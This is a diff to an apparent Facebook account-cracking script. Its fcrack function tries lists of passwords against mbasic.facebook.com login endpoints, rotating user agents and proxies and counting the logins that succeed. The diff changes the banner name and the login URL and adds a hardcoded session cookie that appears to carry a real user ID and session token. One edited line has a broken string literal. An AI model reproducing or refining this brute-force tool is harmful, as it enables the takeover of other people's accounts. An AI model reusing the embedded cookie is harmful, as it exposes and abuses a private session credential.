@@ -809,7 +809,7 @@ def fcrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.Pari\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
+			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.Dani\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
 			sys.stdout.flush()
 			ua = random.choice(ugen)
 			nip=random.choice(prox)
@@ -827,14 +827,14 @@ def fcrack(uid,pwx,tl):
 			"login":"Log In"}
 			header_freefb = {'authority': 'mbasic.facebook.com',
             'method': 'GET',
-            'path': '/home.php?paipv=0&eav=Afap2_uJo9Q_g8JoU-mSAB3abE-hB6dRk92w4fiq1WuuopAsBCMPX41Yxzo3lLdr9NQ&_rdr',
+            'path': /login/?refsrc=deprecated&_rdr',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-
-            'referer': 'https://mbasic.facebook.com/login/device-based/edit-user/?uid=100089252916634&src=0&refsrc=deprecated&_rdr',
+            'cookie': 'sb=nKBSYqRECxyL7RuJr8vc0xu1; datr=nKBSYvrx9hfYlie57qaPOHCi; m_pixel_ratio=0.625; dpr=0.8333333730697632; locale=en_US; fr=0hLscfSFT8A5vSA7Q.AWWM8tISalP71KhdAPk7eCDqueY.Bjtru5.df.AAA.0.0.Bjtzqi.AWU22nq7LRE; c_user=100089252916634; xs=49%3AIyTKkVAReMiuzw%3A2%3A1672952482%3A-1%3A5904; m_page_voice=100089252916634; wd=1024x615',
+           
             'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
@@ -844,7 +844,7 @@ def fcrack(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': ua}
-			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=400',data=log_data,headers=header_freefb).text
+			lo = session.post('https://mbasic.facebook.com/login/?refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
